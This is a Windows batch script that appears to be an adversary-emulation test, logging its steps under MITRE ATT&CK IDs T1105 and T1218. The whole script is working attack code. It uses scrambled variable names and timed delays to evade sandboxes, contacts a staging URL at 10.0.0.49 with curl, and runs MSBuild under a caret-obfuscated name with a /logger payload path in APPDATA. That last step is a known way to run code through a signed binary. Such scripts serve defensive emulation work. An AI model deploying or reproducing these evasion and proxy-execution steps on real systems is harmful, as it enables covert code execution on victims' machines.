@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET txisnba=%APPDATA%\8717\97d2f866
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8717-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=taskmgr.txt
SET dvhhyc=8717
SET bjqpl="%APPDATA%\!rrocubc!\macula-simulations.log"

echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: script_start>> !bjqpl! 2>nul
timeout /t 45 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: initial_delay_complete>> !bjqpl! 2>nul

echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: heartbeat_start>> !bjqpl! 2>nul
curl -k -s -o nul "!keghkgto!"
SET /A hresult=!ERRORLEVEL!
SET herr=
IF NOT !hresult!==0 SET herr=curl_failed_!hresult!
echo [!DATE! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1105|Ingress Tool Transfer=!hresult!:!herr!>> !bjqpl! 2>nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: heartbeat_result=!hresult!>> !bjqpl! 2>nul
ping -n 8 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: ping_delay_complete>> !bjqpl! 2>nul

SET fgx=ms
SET hjr=bui
SET pkl=l^d.^e^xe
SET cmd=!fgx!!hjr!!pkl!
SET /A delay=%RANDOM% %% 20 + 10
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: random_delay_start=!delay!s>> !bjqpl! 2>nul
timeout /t !delay! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: random_delay_complete>> !bjqpl! 2>nul

SET lgr=log^ger:L^ogg^erE^nt^ry,
SET pth=!txisnba!\\!xzanpex!
SET par=;^My^Pa^ra^me^te^rs^,Fo^o
SET fulcmd=/!lgr!!pth!!par!
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: msbuild_exec_start>> !bjqpl! 2>nul
CALL !cmd! !fulcmd!
SET /A mresult=!ERRORLEVEL!
SET merr=
IF NOT !mresult!==0 SET merr=msbuild_failed_!mresult!
echo [!DATE! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!mresult!:!merr!>> !bjqpl! 2>nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: msbuild_result=!mresult!>> !bjqpl! 2>nul
CHOICE /C Y /N /D Y /T 12 >nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: script_end>> !bjqpl! 2>nul